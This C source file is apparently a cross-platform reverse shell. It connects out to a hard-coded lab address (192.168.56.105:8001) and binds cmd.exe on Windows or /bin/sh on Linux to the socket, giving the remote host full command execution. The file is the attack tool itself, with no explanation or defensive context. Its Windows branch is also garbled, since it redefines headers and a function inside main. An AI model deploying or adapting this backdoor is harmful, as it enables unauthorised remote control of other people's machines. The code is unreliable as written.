#ifdef _WIN32
  #define _WIN32_WINNT 0x0600
  #include <winsock2.h>
  #include <ws2tcpip.h>
  #include <windows.h>
  #include <stdio.h>
  #include <stdlib.h>
  #pragma comment(lib, "ws2_32.lib")
#else
  #include <stdio.h>
  #include <stdlib.h>
  #include <unistd.h>
  #include <netinet/in.h>
  #include <sys/types.h>
  #include <sys/socket.h>
  #include <arpa/inet.h>
  #include <string.h>
#endif

void exit_with_error(const char* msg) {
    perror(msg);
    exit(EXIT_FAILURE);
}

int main() {
    const char* server_ip = "192.168.56.105"; // Change to your server's IP address
    short port_num = 8001;

#ifdef _WIN32
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

void exit_with_error(const char* msg) {
    fprintf(stderr, "%s\n", msg);
    exit(EXIT_FAILURE);
}
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    HANDLE hChildStd_IN_Rd = NULL;
    HANDLE hChildStd_IN_Wr = NULL;
    HANDLE hChildStd_OUT_Rd = NULL;
    HANDLE hChildStd_OUT_Wr = NULL;
    SECURITY_ATTRIBUTES saAttr;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
        exit_with_error("WSAStartup failed");
    }

    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        exit_with_error("Socket creation failed");
    }

    server.sin_family = AF_INET;
	server.sin_port = htons(port_num);
    server.sin_addr.s_addr = inet_addr(server_ip);

    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
        exit_with_error("Connection failed");
    }

    // Set up security attributes for pipe handles
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;

    // Create pipe for child process stdout
    if (!CreatePipe(&hChildStd_OUT_Rd, &hChildStd_OUT_Wr, &saAttr, 0))
        exit_with_error("Stdout pipe creation failed");

    // Ensure the read handle to the pipe for stdout is not inherited
    if (!SetHandleInformation(hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0))
        exit_with_error("Stdout SetHandleInformation failed");

    // Create pipe for child process stdin
    if (!CreatePipe(&hChildStd_IN_Rd, &hChildStd_IN_Wr, &saAttr, 0))
        exit_with_error("Stdin pipe creation failed");

    // Ensure the write handle to the pipe for stdin is not inherited
    if (!SetHandleInformation(hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0))
        exit_with_error("Stdin SetHandleInformation failed");

    // Set up STARTUPINFO structure
    ZeroMemory(&si, sizeof(STARTUPINFO));
    si.cb = sizeof(STARTUPINFO);
    si.hStdError = hChildStd_OUT_Wr;
    si.hStdOutput = hChildStd_OUT_Wr;
    si.hStdInput = hChildStd_IN_Rd;
    si.dwFlags |= STARTF_USESTDHANDLES;

    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));

    // Create the child process (cmd.exe)
    if (!CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        exit_with_error("CreateProcess failed");
    }

    // Close pipe handles that are not needed by the parent
    CloseHandle(hChildStd_OUT_Wr);
    CloseHandle(hChildStd_IN_Rd);

    // Now loop to relay data between the socket and the child process pipes
    char buffer[4096];
    DWORD bytesRead, bytesWritten;
    int ret;

	while (1) {
		// Check if socket has data
		fd_set readfds;
		FD_ZERO(&readfds);
		FD_SET(sock, &readfds);
		struct timeval tv = {0, 100000}; // 100 ms timeout

		int selectResult = select(0, &readfds, NULL, NULL, &tv);
		if (selectResult > 0 && FD_ISSET(sock, &readfds)) {
			int ret = recv(sock, buffer, sizeof(buffer), 0);
			if (ret <= 0) break; // disconnected or error
			DWORD written;
			WriteFile(hChildStd_IN_Wr, buffer, ret, &written, NULL);
		}

		// Check if pipe has data
		DWORD bytesAvailable = 0;
		if (PeekNamedPipe(hChildStd_OUT_Rd, NULL, 0, NULL, &bytesAvailable, NULL) && bytesAvailable > 0) {
			DWORD bytesRead = 0;
			if (ReadFile(hChildStd_OUT_Rd, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0) {
				send(sock, buffer, bytesRead, 0);
			}
		}
	}

    // Cleanup
    CloseHandle(hChildStd_IN_Wr);
    CloseHandle(hChildStd_OUT_Rd);
    closesocket(sock);
    WSACleanup();
    return 0;

#else // Linux / Unix

    int sock;
    struct sockaddr_in server;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        exit_with_error("Socket creation failed");
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(port_num);
    if (inet_pton(AF_INET, server_ip, &server.sin_addr) <= 0) {
        exit_with_error("Invalid address");
    }

    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
        exit_with_error("Connection failed");
    }

    // Redirect stdin, stdout, stderr to the socket
    if (dup2(sock, 0) < 0) exit_with_error("dup2 stdin failed");
    if (dup2(sock, 1) < 0) exit_with_error("dup2 stdout failed");
    if (dup2(sock, 2) < 0) exit_with_error("dup2 stderr failed");

    // Execute the shell
    execl("/bin/sh", "sh", NULL);

    exit_with_error("execl failed");

#endif

    return 0;
}
